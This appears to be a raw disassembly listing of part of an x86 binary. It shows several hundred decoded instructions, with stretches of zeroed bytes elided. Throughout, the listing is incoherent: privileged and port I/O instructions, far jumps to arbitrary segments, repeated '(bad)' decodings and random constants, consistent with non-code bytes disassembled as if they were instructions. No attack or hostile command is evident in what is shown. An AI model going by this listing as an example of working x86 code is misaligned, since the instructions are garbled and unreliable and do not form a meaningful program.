  427289:	jl     0x4272b8
  42728b:	dec    ebp
  42728c:	mul    BYTE PTR [ecx]
  42728e:	cmp    eax,0x4e87e6ed
  427293:	pop    es
  427294:	jo     0x4272e5
  427296:	std    
  427297:	jge    0x4272b8
  427299:	daa    
  42729a:	loope  0x427298
  42729c:	in     eax,0xbe
  42729e:	push   ds
  42729f:	int3   
  4272a0:	xor    eax,0x55df0c3e
  4272a5:	sub    DWORD PTR [edi],ebp
  4272a7:	inc    edx
  4272a8:	cmp    edx,esi
  4272aa:	sub    al,0xfc
  4272ac:	inc    ebp
  4272ad:	lahf   
  4272ae:	push   0x4a
  4272b0:	xchg   ecx,eax
  4272b1:	mov    esi,0x2252bfcd
  4272b6:	pop    ebp
  4272b7:	ret    0xdb25
  4272ba:	xor    al,0x9b
  4272bc:	xor    BYTE PTR [ebx+0x66569ee3],ch
  4272c2:	test   BYTE PTR [edi+0x1c],ch
  4272c5:	xchg   DWORD PTR [esi-0x68],ecx
  4272c8:	fcomp  st(0)
  4272ca:	cld    
  4272cb:	adc    al,BYTE PTR gs:[ebp-0xb19a5ca]
  4272d2:	jae    0x4272c6
  4272d4:	sbb    al,0x3e
  4272d6:	in     eax,0x92
  4272d8:	mov    eax,0xd03471b7
  4272dd:	cs mov bh,0xb1
  4272e0:	push   es
  4272e1:	adc    edx,esi
  4272e3:	fidiv  DWORD PTR [ecx+0x3a]
  4272e6:	mov    esp,0x35e266fe
  4272eb:	repnz fs aaa 
  4272ee:	imul   ecx,DWORD PTR [edx-0x24851189],0xec2c88ca
  4272f8:	retf   
  4272f9:	aaa    
  4272fa:	cmc    
  4272fb:	mov    ds:0x2611a318,al
  427300:	rcl    BYTE PTR [esi-0x5d5864df],cl
  427306:	js     0x4272e6
  427308:	cs daa 
  42730a:	jmp    0xdbfe:0xde299889
  427311:	pushf  
  427312:	or     BYTE PTR [ebx],0x86
  427315:	sahf   
  427316:	mov    dh,0x85
  427318:	fcmovne st,st(3)
  42731a:	pop    ss
  42731b:	mov    edx,0xbfcfc8bf
  427320:	fdiv   st(5),st
  427322:	ja     0x4272c6
  427324:	retf   0x4f72
  427327:	fnstenv [ebx]
  427329:	and    BYTE PTR [esi],0x8c
  42732c:	je     0x4273ad
  42732e:	fisttp QWORD PTR [eax+esi*1+0x36]
  427332:	mov    ds:0xde3f,al
	...
  427393:	add    BYTE PTR [eax],al
  427395:	add    BYTE PTR [edx],dl
  427397:	sbb    eax,0xaf3f8832
  42739c:	mov    edx,0x57f28d9f
  4273a1:	push   esp
  4273a2:	jl     0x42739b
  4273a4:	je     0x427338
  4273a6:	(bad)  
  4273a7:	mov    ds:0x1070001,al
  4273ac:	add    BYTE PTR [eax],al
  4273ae:	lock fidiv WORD PTR [edi-0x57]
  4273b2:	cmp    al,dh
  4273b4:	dec    esi
  4273b5:	ret    0x21cf
  4273b8:	xor    bl,0x75
  4273bb:	and    BYTE PTR [edi-0x58cf0aa4],ch
  4273c1:	jl     0x427441
  4273c3:	lea    edx,ds:0x122042e1
  4273c9:	mov    ebp,0x29f8f766
  4273ce:	adc    esp,DWORD PTR [edi]
  4273d0:	mov    ds:0x9e99223c,al
  4273d5:	lahf   
  4273d6:	mov    eax,ds:0x38276a4b
  4273db:	je     0x4273ea
  4273dd:	aas    
  4273de:	mov    bl,0xf0
  4273e0:	icebp  
  4273e1:	rol    BYTE PTR [ecx-0x3a],0x2b
  4273e5:	lods   eax,DWORD PTR ds:[esi]
  4273e6:	add    DWORD PTR [ecx],ecx
  4273e8:	test   BYTE PTR [edx+0x45],bl
  4273eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4273ec:	jmp    0x42737f
  4273ee:	loopne 0x427405
  4273f0:	jg     0x42745d
  4273f2:	nop
  4273f3:	and    cl,0x67
  4273f6:	add    al,0x39
  4273f8:	rol    BYTE PTR [ecx+eax*1],0xac
  4273fc:	mov    edx,0x574db163
  427401:	in     al,dx
  427402:	mov    dl,0x5a
  427404:	cmp    eax,0x375b7292
  427409:	push   edi
  42740a:	call   0x4a293fcb
  42740f:	loop   0x427452
  427411:	retf   0xc531
  427414:	sub    DWORD PTR [eax],esp
  427416:	outs   dx,DWORD PTR ds:[esi]
  427417:	enter  0x5929,0x8
  42741b:	cmp    al,0x44
  42741d:	pop    es
  42741e:	jge    0x427424
  427420:	clc    
  427421:	cmp    esp,DWORD PTR [edi-0x28]
  427424:	int3   
  427425:	mov    al,ds:0x4fe670e7
  42742a:	les    ecx,FWORD PTR [edi]
  42742c:	(bad)  
  42742e:	call   0x1dbe02bd
  427433:	pop    edi
  427434:	(bad)  
  427435:	adc    bl,BYTE PTR [edx-0x119c0ade]
  42743b:	adc    bh,BYTE PTR [edi-0x3b]
  42743e:	jle    0x4273df
  427440:	sbb    ebx,DWORD PTR [edi]
  427442:	or     BYTE PTR [ebp+0x7dd493c8],al
  427448:	mov    al,ds:0x1a1c1161
  42744d:	fmul   QWORD PTR [ebx]
  42744f:	mov    cl,0xc2
  427451:	push   0xb
  427453:	into   
  427454:	add    esi,DWORD PTR [ebp+0x4d]
  427457:	retf   
  427458:	ss retf 0x77c4
  42745c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42745d:	lods   eax,DWORD PTR ds:[esi]
  42745e:	lahf   
  42745f:	loope  0x4273f6
  427461:	jmp    0x33f5fa6f
  427466:	imul   eax,esi,0x167eb04d
  42746c:	xchg   esi,eax
  42746d:	es ss adc eax,0xda8bc998
  427474:	in     eax,dx
  427475:	sub    eax,0x231caba3
  42747a:	test   DWORD PTR [ecx-0x4],edi
  42747d:	stos   DWORD PTR es:[edi],eax
  42747e:	mov    ebx,0x5e018b10
  427483:	or     esp,DWORD PTR [eax+0x78a2d842]
  427489:	test   BYTE PTR [eax],cl
  42748b:	cmp    dl,bl
  42748d:	xor    BYTE PTR [eax-0x6d],bl
  427490:	dec    esp
  427491:	adc    al,0xfc
  427493:	iret   
  427494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427495:	xchg   ebp,eax
  427496:	pop    edx
  427497:	xor    BYTE PTR [eax-0x63cfa358],dh
  42749d:	mov    edi,0x12d35e11
  4274a2:	pop    ebx
  4274a3:	ror    BYTE PTR [eax-0x247e0106],cl
  4274a9:	push   ss
  4274aa:	stos   DWORD PTR es:[edi],eax
  4274ab:	les    ebp,FWORD PTR [edx-0x76831889]
  4274b1:	mov    cl,0x28
  4274b3:	mov    ds:0xd0,eax
	...
  427514:	add    BYTE PTR [eax],al
  427516:	pop    esp
  427517:	test   al,0xc0
  427519:	stos   DWORD PTR es:[edi],eax
  42751a:	hlt    
  42751b:	jmp    0x42759c
  42751d:	jmp    DWORD PTR [ecx+0x4fa6f50a]
  427523:	shr    BYTE PTR [edx-0x5f],0x96
  427527:	mov    ds:0x1070001,eax
  42752c:	add    BYTE PTR [eax],al
  42752e:	xchg   BYTE PTR [ebx+edi*2+0x2aec8427],ah
  427535:	cmp    DWORD PTR [esi+edx*1],esp
  427538:	nop
  427539:	inc    ebx
  42753a:	xchg   edx,eax
  42753b:	ror    esp,1
  42753d:	clc    
  42753e:	cmp    al,0xd4
  427540:	out    0x4f,eax
  427542:	sub    BYTE PTR [esi+0x39468d43],dl
  427548:	scas   al,BYTE PTR es:[edi]
  427549:	mov    al,BYTE PTR fs:[eax-0x3b789dc5]
  427550:	fnstcw WORD PTR [edx]
  427552:	fist   DWORD PTR [esi-0x73]
  427555:	jecxz  0x427591
  427557:	or     DWORD PTR [esi],ecx
  427559:	loopne 0x427503
  42755b:	mov    cl,0xa9
  42755d:	xor    DWORD PTR [esi-0x4d2392a8],ecx
  427563:	and    dl,bl
  427565:	leave  
  427566:	(bad)  
  427567:	(bad)  ds:0x5f1aa424
  42756d:	mov    dh,0xd5
  42756f:	sbb    eax,0xefb921f
  427574:	int    0x2b
  427576:	jb     0x427595
  427578:	fnstcw WORD PTR [ebp-0x6af76c16]
  42757e:	sbb    eax,0x791c2326
  427583:	stos   BYTE PTR es:[edi],al
  427584:	aas    
  427585:	inc    ecx
  427586:	sbb    dl,al
  427588:	sub    eax,0xec2231e2
  42758d:	es push cs
  42758f:	push   edx
  427590:	push   cs
  427591:	and    ebx,DWORD PTR [ebx-0x5f]
  427594:	jne    0x4275a1
  427596:	push   ebp
  427597:	call   0x6c6f2456
  42759c:	loop   0x427605
  42759e:	idiv   bh
  4275a0:	aaa    
  4275a1:	retf   
  4275a2:	stos   DWORD PTR es:[edi],eax
  4275a3:	xor    DWORD PTR [edx],edi
  4275a5:	retf   
  4275a6:	and    al,0x5c
  4275a8:	sbb    al,0x1d
  4275aa:	xchg   ecx,eax
  4275ab:	pop    esp
  4275ac:	mov    edi,0xb261d295
  4275b1:	mov    dh,0x49
  4275b3:	jmp    FWORD PTR [ecx-0x3a51031c]
  4275b9:	push   edx
  4275ba:	daa    
  4275bb:	pop    es
  4275bc:	pushf  
  4275bd:	retf   
  4275be:	sti    
  4275bf:	(bad)  
  4275c0:	xchg   edx,eax
  4275c1:	sbb    edi,DWORD PTR [ecx+0x7c]
  4275c4:	cmp    al,0x4c
  4275c6:	push   edi
  4275c7:	adc    DWORD PTR [ecx],ebx
  4275c9:	cmp    BYTE PTR [esi+0x413aff31],bh
  4275cf:	xchg   esp,eax
  4275d0:	lds    ebp,FWORD PTR [edx-0x5]
  4275d3:	addr16 out dx,eax
  4275d5:	sbb    dh,bh
  4275d7:	outs   dx,DWORD PTR ds:[esi]
  4275d8:	xchg   esi,eax
  4275d9:	out    0xf2,al
  4275db:	inc    eax
  4275dc:	test   DWORD PTR [edx+0x1b],ebp
  4275df:	add    al,BYTE PTR [esi]
  4275e1:	cmp    al,bl
  4275e3:	ds xchg esp,eax
  4275e5:	jp     0x427568
  4275e7:	js     0x427588
  4275e9:	inc    ebx
  4275ea:	les    edx,FWORD PTR [esi-0x48818f14]
  4275f0:	retf   0x818a
  4275f3:	sti    
  4275f4:	push   eax
  4275f5:	test   al,0x37
  4275f7:	push   edx
  4275f8:	stc    
  4275f9:	sar    cl,1
  4275fb:	fldcw  WORD PTR [ebx]
  4275fd:	jno    0x4275e7
  4275ff:	mov    dh,al
  427601:	push   edi
  427602:	mov    ds:0x6389a762,eax
  427607:	shl    BYTE PTR [eax],0x4
  42760a:	inc    ebx
  42760b:	push   0x7
  42760d:	jbe    0x427598
  42760f:	or     BYTE PTR [ecx],dl
  427611:	xchg   ebp,eax
  427612:	xor    al,0x82
  427614:	rol    DWORD PTR [ecx+0x48],0x50
  427618:	add    ebx,ebx
  42761a:	out    0xce,al
  42761c:	jnp    0x427616
  42761e:	pop    eax
  42761f:	pop    edi
  427620:	out    0xe3,al
  427622:	in     al,dx
  427623:	xchg   ebp,eax
  427624:	(bad)  
  427625:	icebp  
  427626:	daa    
  427627:	mov    eax,ds:0x14c62f4c
  42762c:	pop    eax
  42762d:	push   es
  42762e:	push   ss
  42762f:	xchg   ecx,eax
  427630:	gs push ecx
  427632:	and    eax,0x7e94
	...
  427693:	add    BYTE PTR [eax],al
  427695:	add    BYTE PTR [ecx],al
  427697:	push   esi
  427698:	nop
  427699:	out    dx,al
  42769a:	xlat   BYTE PTR ds:[ebx]
  42769b:	out    dx,al
  42769c:	jg     0x42769d
  42769e:	xchg   edi,eax
  42769f:	in     eax,dx
  4276a0:	imul   ebx,eax,0xb75e3ded
  4276a6:	popf   
  4276a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276a8:	add    DWORD PTR [eax],eax
  4276aa:	pop    es
  4276ab:	add    DWORD PTR [eax],eax
  4276ad:	add    BYTE PTR [esi+edx*8],cl
  4276b0:	popa   
  4276b1:	cmp    al,0x93
  4276b3:	jae    0x4276f1
  4276b5:	retf   0xe386
  4276b8:	into   
  4276b9:	enter  0xb748,0x26
  4276bd:	je     0x42768a
  4276bf:	inc    edi
  4276c0:	fld    TBYTE PTR [ebp-0x437a395f]
  4276c6:	add    esp,DWORD PTR [edx-0x1a43a6ff]
  4276cc:	pop    ds
  4276cd:	or     edi,DWORD PTR [ebx+0xc60da3a]
  4276d3:	jmp    0x3fda22cd
  4276d8:	pop    esi
  4276d9:	fisubr DWORD PTR [eax+edi*1-0x213d2d7]
  4276e0:	scas   al,BYTE PTR es:[edi]
  4276e1:	ins    DWORD PTR es:[edi],dx
  4276e2:	push   eax
  4276e3:	sti    
  4276e4:	add    ebx,0xa24c4c31
  4276ea:	nop
  4276eb:	push   ebp
  4276ec:	xchg   ebp,eax
  4276ed:	mov    ds:0xd6020c72,eax
  4276f2:	aas    
  4276f3:	or     al,0xc1
  4276f5:	mov    ds:0x8824fac,eax
  4276fa:	jge    0x427717
  4276fc:	cli    
  4276fd:	lds    ecx,FWORD PTR [edi-0x57b48d04]
  427703:	jmp    0x427782
  427705:	add    eax,DWORD PTR ds:0x28dbab1d
  42770b:	inc    edx
  42770c:	cmp    dl,BYTE PTR es:[eax+0x47]
  427710:	fild   WORD PTR [ecx-0x4a]
  427713:	inc    esp
  427714:	inc    esp
  427715:	outs   dx,DWORD PTR ds:[esi]
  427716:	or     ch,BYTE PTR [eax-0x61]
  427719:	push   ebp
  42771a:	cmc    
  42771b:	or     BYTE PTR [edx],al
  42771d:	daa    
  42771e:	iret   
  42771f:	dec    ecx
  427720:	jp     0x42778e
  427722:	ins    BYTE PTR es:[edi],dx
  427723:	mov    BYTE PTR [ecx-0x12],dh
  427726:	and    eax,0x365934dd
  42772b:	mov    eax,ebx
  42772d:	sti    
  42772e:	outs   dx,BYTE PTR ds:[esi]
  42772f:	fsub   DWORD PTR [eax]
  427731:	(bad)  
  427732:	(bad)  
  427733:	push   0xe915219
  427738:	xor    DWORD PTR [esi+0x23],eax
  42773b:	pop    edx
  42773c:	xor    BYTE PTR [eax+ebx*1-0x5ea01aba],0x36
  427744:	jecxz  0x42773f
  427746:	and    DWORD PTR [edi+edx*2],ecx
  427749:	iret   
  42774a:	push   cs
  42774b:	repnz sbb BYTE PTR [eax+0x31a164f1],dl
  427752:	xor    DWORD PTR ds:0x9fb93508,edi
  427758:	clc    
  427759:	adc    ebx,DWORD PTR ds:0x688c
  42775e:	and    bl,BYTE PTR [ebx]
  427760:	icebp  
  427761:	or     esp,esi
  427763:	fbld   TBYTE PTR [esi+esi*2+0x6853b323]
  42776a:	lea    ebp,[eax+ebp*2+0x5ca53884]
  427771:	add    DWORD PTR [ecx-0x6f],0xd437964f
  427778:	sahf   
  427779:	aad    0xf4
  42777b:	push   ds
  42777c:	cmp    esi,DWORD PTR [eax+0x52fc9384]
  427782:	jl     0x4277d8
  427784:	dec    ebx
  427785:	cmp    eax,0x96b43a1a
  42778a:	in     al,0x1a
  42778c:	mov    ebx,DWORD PTR [esi-0x12]
  42778f:	xor    eax,0xf0e1245c
  427794:	and    DWORD PTR [esi-0x363a9ea7],eax
  42779a:	imul   eax,DWORD PTR [edi+0x17],0x1d78ce72
  4277a1:	pop    edi
  4277a2:	and    DWORD PTR [esi-0x13],ebp
  4277a5:	xchg   ecx,eax
  4277a6:	xchg   edx,eax
  4277a7:	gs push esp
  4277a9:	pop    es
  4277aa:	pop    eax
  4277ab:	sbb    eax,0x96444e63
  4277b0:	int3   
  4277b1:	and    DWORD PTR [edx+ebx*4-0x5],ebx
	...
  427815:	add    BYTE PTR [edx],bl
  427817:	mov    cl,BYTE PTR [ebx]
  427819:	inc    ebp
  42781a:	fwait
  42781b:	lds    ebx,FWORD PTR [esi-0x21]
  42781e:	push   edx
  42781f:	sar    DWORD PTR [edi+eiz*1],1
  427822:	mov    WORD PTR [edi],ss
  427824:	add    al,0xe1
  427826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427828:	add    DWORD PTR [eax],eax
  42782a:	pop    es
  42782b:	add    DWORD PTR [eax],eax
  42782d:	add    BYTE PTR [edi],dl
  42782f:	add    edi,DWORD PTR [edi-0x4b26650e]
  427835:	xchg   ebx,eax
  427836:	dec    edi
  427837:	pop    edx
  427838:	rcl    ebp,1
  42783a:	lods   al,BYTE PTR ds:[esi]
  42783b:	fcomip st,st(1)
  42783d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42783e:	jge    0x427857
  427840:	and    DWORD PTR [ebp+0x1d],edx
  427843:	push   esi
  427844:	xchg   ecx,eax
  427845:	add    al,0xa7
  427847:	inc    DWORD PTR [eax]
  427849:	xchg   ebp,eax
  42784a:	sar    esi,1
  42784c:	sbb    al,0xe3
  42784e:	mov    DWORD PTR [eax+0x1b],eax
  427851:	rol    DWORD PTR [edx+0x3d],cl
  427854:	and    BYTE PTR [edi+ecx*4+0x7ffa8370],ah
  42785b:	add    DWORD PTR [ebx+0x58],ebp
  42785e:	test   DWORD PTR [ebp+0x4b],esp
  427861:	or     eax,0x4d81387e
  427866:	push   esi
  427867:	loop   0x42787d
  427869:	std    
  42786a:	and    ch,BYTE PTR [esi]
  42786c:	adc    eax,0x801868db
  427871:	in     al,0x4c
  427873:	or     esp,ecx
  427875:	pusha  
  427876:	push   edi
  427877:	dec    edi
  427878:	or     dh,BYTE PTR [edi]
  42787a:	or     al,0x13
  42787c:	xchg   ecx,eax
  42787d:	retf   
  42787e:	and    BYTE PTR [edi-0x40],al
  427881:	and    DWORD PTR es:[eax],ecx
  427884:	test   BYTE PTR [edi+0x5e7007df],ch
  42788a:	sub    dl,bl
  42788c:	call   0xf7d0:0x1e2526ad
  427893:	xacquire xchg DWORD PTR [ecx+0x258d1fe8],eax
  42789a:	in     al,dx
  42789b:	mov    ds:0x4c621499,al
  4278a0:	jecxz  0x42787e
  4278a2:	adc    al,0xec
  4278a4:	cmp    al,0x7b
  4278a6:	(bad)  
  4278a9:	jl     0x427901
  4278ab:	stc    
  4278ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278ad:	jns    0x427835
  4278af:	jp     0x4278d6
  4278b1:	xor    BYTE PTR [eax+ebp*8-0x4b2faeba],0x2a
  4278b9:	lock pop esi
  4278bb:	sbb    ebp,DWORD PTR [eax-0xb]
  4278be:	add    ebx,ecx
  4278c0:	and    DWORD PTR [eax+0x68e8f537],ebx
  4278c6:	jle    0x42788e
  4278c8:	in     al,dx
  4278c9:	dec    ebx
  4278ca:	jmp    0x42786e
  4278cc:	aad    0x5a
  4278ce:	push   cs
  4278cf:	sub    DWORD PTR [eax],edx
  4278d1:	add    bl,BYTE PTR [esi]
  4278d3:	fwait
  4278d4:	jns    0x427927
  4278d6:	push   esp
  4278d7:	mov    eax,ds:0x9ee2d48d
  4278dc:	loopne 0x4278ba
  4278de:	mov    al,0xee
  4278e0:	or     al,0xdb
  4278e2:	push   es
  4278e3:	and    BYTE PTR [edi],ah
  4278e5:	add    BYTE PTR [edi-0x7aa39757],dh
  4278eb:	xchg   esp,eax
  4278ec:	sub    eax,0x1ac66ace
  4278f1:	jnp    0x42788a
  4278f3:	mov    cl,0xf4
  4278f5:	das    
  4278f6:	jecxz  0x427900
  4278f8:	pop    edx
  4278f9:	xchg   DWORD PTR [edi-0x6bc68161],edi
  4278ff:	ins    DWORD PTR es:[edi],dx
  427900:	repz xor DWORD PTR [ebx+ecx*2],ebx
  427904:	sub    BYTE PTR [esi+0x33349cad],dl
  42790a:	call   0x18550ab0
  42790f:	jnp    0x42796a
  427911:	mov    ecx,0x17db1fc0
  427916:	iret   
  427917:	jb     0x427953
  427919:	arpl   WORD PTR [edi+0x46],cx
  42791c:	mul    DWORD PTR [ebp-0x65e78284]
  427922:	sub    BYTE PTR ds:0x507c9802,dl
  427928:	in     eax,dx
  427929:	and    eax,0x65f97b60
  42792e:	push   0x1f969b75
  427933:	ret    0xcf
	...
  427996:	call   0xdea3:0xffa3ffdd
  42799d:	std    
  42799e:	in     eax,0x63
  4279a0:	mov    ebx,0xb75f49d0
  4279a5:	pop    es
  4279a6:	stos   DWORD PTR es:[edi],eax
  4279a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279a8:	add    DWORD PTR [eax],eax
  4279aa:	pop    es
  4279ab:	add    DWORD PTR [eax],eax
  4279ad:	add    BYTE PTR [ebp+0xa],al
  4279b0:	sbb    eax,0xaa7eafc5
  4279b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4279b6:	sbb    ebp,ebx
  4279b8:	xchg   esp,eax
  4279b9:	data16 je 0x42794d
  4279bc:	push   ebp
  4279bd:	repnz mov esi,0x86f41f59
  4279c3:	sub    DWORD PTR [edi-0x1048a7d6],ecx
  4279c9:	iret   
  4279ca:	lock pop ebx
  4279cc:	das    
  4279cd:	push   ebx
  4279ce:	daa    
  4279cf:	sar    DWORD PTR [ebp+0x2371f207],1
  4279d5:	push   esp
  4279d6:	aas    
  4279d7:	sbb    eax,0x467a550f
  4279dd:	add    ah,BYTE PTR ds:0x1998cca4
  4279e3:	jmp    0xec94:0xb1f421c8
  4279ea:	pushf  
  4279eb:	test   eax,0x48b9b6ff
  4279f0:	nop
  4279f1:	jmp    FWORD PTR [edx]
  4279f3:	aaa    
  4279f4:	xor    DWORD PTR [ebp+0x72b2f91b],edi
  4279fa:	test   al,0x6
  4279fc:	into   
  4279fd:	loopne 0x427a50
  4279ff:	shl    BYTE PTR [edx+edx*2-0x7f],cl
  427a03:	mov    ch,ah
  427a05:	adc    esi,DWORD PTR [edi-0x247ffcaa]
  427a0b:	pop    ecx
  427a0c:	xchg   DWORD PTR [edi],ebp
  427a0e:	pop    ss
  427a0f:	sbb    al,0x98
  427a11:	pop    es
  427a12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a13:	int3   
  427a14:	sub    dh,al
  427a16:	dec    BYTE PTR [eax]
  427a18:	faddp  st(4),st
  427a1a:	xchg   ebp,eax
  427a1b:	sub    eax,0x2b112267
  427a20:	mov    ebp,0xa4f8f42f
  427a25:	xchg   edi,eax
  427a26:	sub    BYTE PTR ds:0x873e42de,ch
  427a2c:	push   esi
  427a2d:	cmp    ch,BYTE PTR [ebp-0x63083a3c]
  427a33:	test   DWORD PTR [edx+edx*8],0x112129c8
  427a3a:	ror    BYTE PTR [esi+0x24],0xa9
  427a3e:	mov    esp,0xc8769662
  427a43:	jnp    0x427a1a
  427a45:	push   edx
  427a46:	ins    DWORD PTR es:[edi],dx
  427a47:	dec    ebx
  427a48:	and    eax,0xdeba2fcc
  427a4d:	test   BYTE PTR [edi+0x6e0ad666],ch
  427a53:	mov    bh,0x9a
  427a55:	(bad)  
  427a56:	aas    
  427a57:	push   eax
  427a58:	sub    eax,0xb7812a13
  427a5d:	mov    dh,0x9b
  427a5f:	cmovle ebx,DWORD PTR [edi+0x77]
  427a63:	shl    ah,cl
  427a65:	pop    edx
  427a66:	mov    esp,0xb7e7053e
  427a6b:	bound  esp,QWORD PTR [esi-0x29]
  427a6e:	pop    eax
  427a6f:	out    0x66,al
  427a71:	and    ebp,DWORD PTR [esp+eax*4+0x3b6418fc]
  427a78:	inc    eax
  427a79:	arpl   cx,sp
  427a7b:	sub    al,BYTE PTR [edx]
  427a7d:	imul   ebp,DWORD PTR [ebx+0x49],0xffffff8a
  427a81:	sti    
  427a82:	leave  
  427a83:	test   DWORD PTR [ecx+0x27ab4cdd],ecx
  427a89:	sbb    BYTE PTR [ecx],0xc
  427a8c:	fcomp  QWORD PTR [edi-0x4e56ef68]
  427a92:	push   0x2f6e1759
  427a97:	cs pop ecx
  427a99:	xchg   esi,eax
  427a9a:	adc    DWORD PTR [edx-0x3b],ecx
  427a9d:	mov    bh,dl
  427a9f:	pop    edx
  427aa0:	pop    esi
  427aa1:	mov    WORD PTR [edx],cs
  427aa3:	gs gs fxam 
  427aa7:	mov    edx,0x13851c22
  427aac:	jp     0x427b04
  427aae:	fdiv   DWORD PTR [eax+0xb]
  427ab1:	jg     0x427ab5
  427ab3:	int3   
  427ab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  427b15:	add    dl,cl
  427b17:	mov    edx,DWORD PTR [edx+0x7b]
  427b1a:	push   ebx
  427b1b:	sti    
  427b1c:	jmp    0x427ad9
  427b1e:	pop    edx
  427b1f:	dec    eax
  427b20:	pop    edx
  427b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b22:	call   0x1a7:0xb207cc43
  427b29:	add    BYTE PTR [edi],al
  427b2b:	add    DWORD PTR [eax],eax
  427b2d:	add    BYTE PTR [esi+edx*1-0x492b3078],dl
  427b34:	cdq    
  427b35:	mov    esp,0xa0cbe99c
  427b3a:	xchg   edx,eax
  427b3b:	enter  0xdf4,0xc
  427b3f:	test   esp,ecx
  427b41:	adc    al,0xb2
  427b43:	dec    esp
  427b44:	and    DWORD PTR [esi-0x4c],0xfffffffb
  427b48:	mov    esi,0x42416aff
  427b4d:	xor    eax,DWORD PTR [ebp-0x79]
  427b50:	repnz and DWORD PTR [edi+0x35d492a0],ebp
  427b57:	fidiv  WORD PTR [eax-0x7e]
  427b5a:	cli    
  427b5b:	ss jne 0x427b50
  427b5e:	mov    DWORD PTR [ebx-0x55],edx
  427b61:	out    dx,eax
  427b62:	ret    0xea7a
  427b65:	sub    ch,ch
  427b67:	pop    ebx
  427b68:	pop    ecx
  427b69:	sub    esp,DWORD PTR [edi+0x79]
  427b6c:	stos   BYTE PTR es:[edi],al
  427b6d:	mov    al,BYTE PTR [ecx]
  427b6f:	xor    al,0x79
  427b71:	mov    edx,DWORD PTR [esi-0x26eccc55]
  427b77:	and    dh,BYTE PTR [edx]
  427b79:	call   0x850:0x145440a9
  427b80:	test   al,0xe2
  427b82:	mov    al,0xca
  427b84:	xlat   BYTE PTR ds:[ebx]
  427b85:	call   0xce9717fb
  427b8a:	or     al,0x94
  427b8c:	sti    
  427b8d:	pop    edi
  427b8e:	stos   BYTE PTR es:[edi],al
  427b8f:	nop
  427b90:	jmp    0x2550b4b0
  427b95:	retf   
  427b96:	shl    BYTE PTR [edx+0x36754453],0x33
  427b9d:	in     al,dx
  427b9e:	icebp  
  427b9f:	into   
  427ba0:	fwait
  427ba1:	dec    edx
  427ba2:	adc    cl,BYTE PTR [eax-0x317c973c]
  427ba8:	mov    DWORD PTR [eax+0x45],eax
  427bab:	popa   
  427bac:	hlt    
  427bad:	int3   
  427bae:	into   
  427baf:	pop    ebx
  427bb0:	sub    ebx,DWORD PTR [esi-0x5c]
  427bb3:	push   eax
  427bb4:	mov    ds:0xf7f67da7,al
  427bb9:	xor    BYTE PTR [esi+0x79d26d72],dh
  427bbf:	jl     0x427b80
  427bc1:	hlt    
  427bc2:	pop    ebx
  427bc3:	sbb    bh,BYTE PTR [edi-0x6d]
  427bc6:	add    DWORD PTR [eax],ebp
  427bc8:	pop    ds
  427bc9:	xchg   ebp,eax
  427bca:	(bad)  
  427bcb:	nop
  427bcc:	ficom  DWORD PTR [edi-0x60545578]
  427bd2:	(bad)  
  427bd3:	cli    
  427bd4:	inc    edi
  427bd5:	ins    DWORD PTR es:[edi],dx
  427bd6:	xor    eax,0x3ef2c4e0
  427bdb:	adc    BYTE PTR ds:0xdb739301,ah
  427be1:	in     eax,dx
  427be2:	push   es
  427be3:	loop   0x427c06
  427be5:	xor    eax,0xcb2a29ce
  427bea:	int3   
  427beb:	inc    eax
  427bec:	lea    ebp,[eax+0x1f4fc3ef]
  427bf2:	repnz test esp,esp
  427bf5:	xchg   ebp,eax
  427bf6:	inc    ecx
  427bf7:	dec    eax
  427bf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bf9:	out    dx,al
  427bfa:	adc    edi,DWORD PTR [eax-0x41]
  427bfd:	data16 loope 0x427c26
  427c00:	not    DWORD PTR [esi+esi*2+0x6d3a8912]
  427c07:	dec    edx
  427c08:	jecxz  0x427c5a
  427c0a:	or     esp,DWORD PTR [ebx]
  427c0c:	and    edi,DWORD PTR [eax]
  427c0e:	mov    ebp,0x677cdfaf
  427c13:	push   ebx
  427c14:	pop    esi
  427c15:	jns    0x427c20
  427c17:	in     al,dx
  427c18:	lods   eax,DWORD PTR ds:[esi]
  427c19:	pop    ss
  427c1a:	pop    edi
  427c1b:	addr16 adc al,0x23
  427c1e:	fcom   st(3)
  427c20:	push   ds
  427c21:	arpl   sp,di
  427c23:	arpl   WORD PTR [edi],si
  427c25:	test   al,0x5a
  427c27:	enter  0xf2ef,0xc9
  427c2b:	push   edi
  427c2c:	cmc    
  427c2d:	sbb    al,0x63
  427c2f:	out    0xf8,eax
  427c31:	push   edi
  427c32:	shl    cl,cl
  427c34:	retf   0x0
	...
  427c93:	add    BYTE PTR [eax],al
  427c95:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427c9b:	jecxz  0x427c90
  427c9d:	lock xchg edi,eax
  427c9f:	fmul   DWORD PTR ds:0xbcd06185
  427ca5:	outs   dx,DWORD PTR ds:[esi]
  427ca6:	mov    ecx,0x70001a8
  427cab:	add    DWORD PTR [eax],eax
  427cad:	add    BYTE PTR [ebx-0x5beb2834],dl
  427cb3:	mov    cs,WORD PTR [esi+0x4e]
  427cb6:	out    0x57,al
  427cb8:	jecxz  0x427cb7
  427cba:	into   
  427cbb:	add    ebx,DWORD PTR [ecx+0x4b]
  427cbe:	call   0xae5b:0x7e48262f
  427cc5:	sti    
  427cc6:	and    ch,dh
  427cc8:	imul   ebp,DWORD PTR [esp+esi*2],0x64961a4c
  427ccf:	in     eax,0x23
  427cd1:	repnz int3 
  427cd3:	jmp    0x427c58
  427cd5:	mov    eax,ds:0x4e748190
  427cda:	into   
  427cdb:	int    0xb2
  427cdd:	sbb    al,0xb5
  427cdf:	retf   
  427ce0:	add    BYTE PTR [edi+0x7dfb87a2],ch
  427ce6:	adc    al,0x43
  427ce8:	rol    DWORD PTR [edi],1
